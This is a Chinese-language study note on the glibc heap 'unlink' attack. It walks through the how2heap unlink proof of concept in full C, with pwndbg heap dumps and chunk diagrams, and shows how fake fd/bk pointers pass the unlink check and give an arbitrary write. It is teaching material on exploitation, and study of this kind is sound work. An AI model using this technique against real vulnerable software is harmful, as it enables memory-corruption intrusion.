# 重温unlink笔记

之前其实一直对于unlink有些懵懵懂懂，今天算是差不多彻底搞懂了

unlink其实就是实现了一个功能，使得被视为P Chunk的Chunk指针会变为P-0x18

我们其实就是在一个chunk里面伪造了一个chunk，通过栈溢出修改后面一个chunk的标志位，然后free它后面的一个chunk，发生unlink操作后，伪造的chunk就取代来原来真正chunk的地址

这里以how2heap之unlink作为示例

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
uint64_t *chunk0_ptr;
int main()
{
        int malloc_size = 0x80; //we want to be big enough not to use fastbins
        int header_size = 2;

        chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
        uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1

        chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);

        chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);

        uint64_t *chunk1_hdr = chunk1_ptr - header_size;

        chunk1_hdr[0] = malloc_size;

        chunk1_hdr[1] &= ~1;

        free(chunk1_ptr);

        char victim_string[8];
        strcpy(victim_string,"Hello!~");
        chunk0_ptr[3] = (uint64_t) victim_string;

        chunk0_ptr[0] = 0x4141414142424242LL;
        fprintf(stderr, "New Value: %sn",victim_string);
}
```

不难看出其实整个程序就分配了两个chunk，一个是chunk0，一个是chunk1

```shell
pwndbg> heap
0x603000 PREV_INUSE {
  prev_size = 0,
  size = 0x91,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x603090 PREV_INUSE {
  prev_size = 0,
  size = 0x91,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x603120 PREV_INUSE {
  prev_size = 0,
  size = 134881,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
```

首先需要指明，我们malloc返回的地址，其实是chunk的mem部分

```
chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if allocated            | |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                       |M|P|
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             User data starts here...                          .
            .                                                               .
            .             (malloc_usable_size() bytes)                      .
            .                                                               |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk                                     |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

对应空闲中的chunk（被free后）就是fd的位置

```
chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk                            |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `head:' |             Size of chunk, in bytes                         |P|
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Forward pointer to next chunk in list             |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Back pointer to previous chunk in list            |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Unused space (may be 0 bytes long)                .
            .                                                               .
            .                                                               |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `foot:' |             Size of chunk, in bytes                           |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

这里其实就是在chunk0的mem空间中伪造了一个假的chunk

```c
chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
```

具体是这样的：

| chunk0（0x603000）  |               |            fake_chunk             |                |
| :-----------------: | :-----------: | :-------------------------------: | :------------: |
|      prev_size      |               |                                   |                |
|        size         |               |                                   |                |
| chunk0_ptr->men->fd | chunk0_ptr[0] |                                   | fake_prev_size |
|         bk          | chunk0_ptr[1] |                                   |   fake_size    |
|                     | chunk0_ptr[2] | &chunk0_ptr-(sizeof(uint64_t)*3); |    fake_fd     |
|                     | chunk0_ptr[3] | &chunk0_ptr-(sizeof(uint64_t)*2); |    fake_bk     |

我们回顾一下unlink的检查操作：

- P.fd->bk = P
- P.bk->fd = P

因为我们直到对于一个chunk：

- fd = chunk_addr（head）+ 0x10
- bk = chunk_addr（head）+ 0x18

所以最后就是：

P.fd + 0x18 = P.bk + 0x10

我们这时候查看一下chunk0中构造的fake_chunk

```c
pwndbg> x/10gx 0x603010
0x603010:       0x0000000000000000      0x0000000000000000
0x603020:       0x0000000000602058      0x0000000000602060
0x603030:       0x0000000000000000      0x0000000000000000
0x603040:       0x0000000000000000      0x0000000000000000
0x603050:       0x0000000000000000      0x0000000000000000
```

|          | fake_chunk |                    |
| :------: | :--------: | :----------------: |
| 0x603010 | prev_size  | 0x0000000000000000 |
| 0x603018 |    size    | 0x0000000000000000 |
| 0x603020 |     fd     | 0x0000000000602058 |
| 0x603028 |     bk     | 0x0000000000602060 |

```
uint64_t *chunk1_hdr = chunk1_ptr - header_size;
chunk1_hdr[0] = malloc_size;
chunk1_hdr[1] &= ~1;
```

这里其实是这样的：

|               |  chunk1   |             |
| :-----------: | :-------: | :---------: |
| chunk1_hdr[0] | prev_size | malloc_size |
| chunk1_hdr[1] |   size    |    &= ~1    |
|  chunk1_ptr   |    fd     |             |
|               |    bk     |             |

相当于修改了chunk1的size位，使得系统认为前一个chunk已经被free，这时候free chunk1就会发生合并操作，这时我们构造的fake_chunk就是P开始检查P的合法性

- P.fd = &chunk0_ptr-(sizeof(uint64_t)*3) = P.mem - 0x18
- p.bk= &chunk0_ptr-(sizeof(uint64_t)*2) = P.mem - 0x10

于是：

- P.fd + 0x18 = P.mem
- P.bk + 0x10 = P.mem
- P.fd + 0x18 = P.bk + 0x10

显而易见的合法，unlink检查被绕过了，chunk1和fake_chunk发生了合并操作，fake_chunk被认为是chunk0